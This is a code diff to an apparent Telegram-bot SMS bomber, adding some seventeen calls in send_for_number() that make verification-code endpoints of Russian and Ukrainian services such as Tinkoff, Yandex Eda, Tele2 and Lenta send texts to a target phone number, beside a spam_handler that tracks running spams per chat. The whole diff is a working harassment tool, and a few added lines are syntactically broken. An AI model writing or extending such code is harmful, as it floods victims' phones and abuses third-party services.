@@ -128,7 +128,23 @@ def send_for_number(phone):
         requests.post('https://www.ozon.ru/api/composer-api.bx/_action/fastEntry', data={'phone': phone})
         requests.post('https://qlean.ru/clients-api/v2/sms_codes/auth/request_code', json={'phone': phone})
         requests.post('https://pass.rutube.ru/api/accounts/phone/send-password/', json={'phone': phone})
-
+        requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': phone})
+        requests.post('https://app.sberfood.ru/api/mobile/v3/auth/sendSms', json={'phone': '+' + phone}, headers={"AppKey": "WebApp-3a2605b0cf2a4c9d938752a84b7e97b6"})
+        requests.post('https://shopandshow.ru/sms/password-request/',data={"phone": "+" + phone, "resend": 0})
+        requests.post('https://register.sipnet.ru/cgi-bin/exchange.dll/RegisterHelper', params={"oper": 9, "callmode": 1, "phone": "+" + phone})
+        requests.post('https://smart.space/api/users/request_confirmation_code/', json={"mobile": "+" + phone, "action": "confirm_mobile"})
+        requests.post('https://api.sunlight.net/v3/customers/authorization/', data={"phone": phone})
+        requests.post('https://msk.tele2.ru/api/validation/number/" + phone', json={"sender": "Tele2"})
+        requests.post('https://api.tinkoff.ru/v1/sign_up', data={"phone": "+" + phone})
+        requests.post('https://pay.visa.ru/api/Auth/code/request', json={"phoneNumber": "+" + phone})
+        requests.post('https://shop.vsk.ru/ajax/auth/postSms/', data={"phone": phone})
+        requests.post('https://api.iconjob.co/api/auth/verification_code', json={"phone": phone})
+        requests.post('https://api.wowworks.ru/v2/site/send-code', json={"phone": phone, "type": 2})
+        requests.post('https://api.chef.yandex/api/v2/auth/sms', json={"phone": phone})
+        requests.post('https://eda.yandex/api/v1/user/request_authentication_code', json={"phone_number": "+" + phone})
+        requests.post('https://lenta.com/api/v1/authentication/requestValidationCode', json={"phone": "+" + phone})
+        requests.post('https://api.kinoland.com.ua/api/v1/service/send-sms', headers={"Agent": "website"},json={"Phone": phone, "Type": 1})
+        requests.post('https://guru.taxi/api/v1/driver/session/verify', json={"phone": {"code": 1, "number": phone})
 
 def spam_handler(phone, chat_id, force):
     if int(chat_id) in running_spams_per_chat_id:
